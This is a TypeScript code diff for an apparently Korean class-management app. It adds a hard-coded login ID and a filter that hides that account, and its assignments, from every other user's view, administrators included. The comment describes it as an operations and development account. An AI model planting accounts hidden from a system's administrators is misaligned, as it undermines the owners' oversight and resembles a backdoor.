@@ -31,6 +31,16 @@ async function fetchAll<T>(table: string): Promise<T[]> {
   return out;
 }
 
+/** 본인이 로그인했을 때만 목록에 보이는 계정(운영·개발용). 다른 계정에는 사용자 목록·배정에서 빠진다. */
+const HIDDEN_LOGIN_IDS = ["boleeten"];
+function hideFor(all: Data, userId: string): Data {
+  const me = all.users.find((u) => u.id === userId);
+  if (me && HIDDEN_LOGIN_IDS.includes(me.loginId)) return all;
+  const hidden = new Set(all.users.filter((u) => HIDDEN_LOGIN_IDS.includes(u.loginId)).map((u) => u.id));
+  if (!hidden.size) return all;
+  return { ...all, users: all.users.filter((u) => !hidden.has(u.id)), assignments: all.assignments.filter((a) => !hidden.has(a.userId)) };
+}
+
 async function loadAll(): Promise<Data> {
   const base = buildSeed();
   const [profiles, classes, assignments, students, sMarks, tMarks, sessions, notes, notifications, notifLogs, audits, settings] = await Promise.all([
@@ -132,7 +142,7 @@ export const remote = {
         await sb!.auth.signOut();
         return "비활성화된 계정입니다. 관리자에게 문의해 주세요.";
       }
-      return { userId: data.user.id, data: all };
+      return { userId: data.user.id, data: hideFor(all, data.user.id) };
     } catch (e) {
       return `데이터를 불러오지 못했습니다. ${(e as Error).message}`;
     }
@@ -141,7 +151,7 @@ export const remote = {
     const { data } = await sb!.auth.getSession();
     if (!data.session) return null;
     try {
-      return { userId: data.session.user.id, data: await loadAll() };
+      return { userId: data.session.user.id, data: hideFor(await loadAll(), data.session.user.id) };
     } catch (e) {
       toast(`데이터를 불러오지 못했습니다. ${(e as Error).message}`, "error");
       return null;
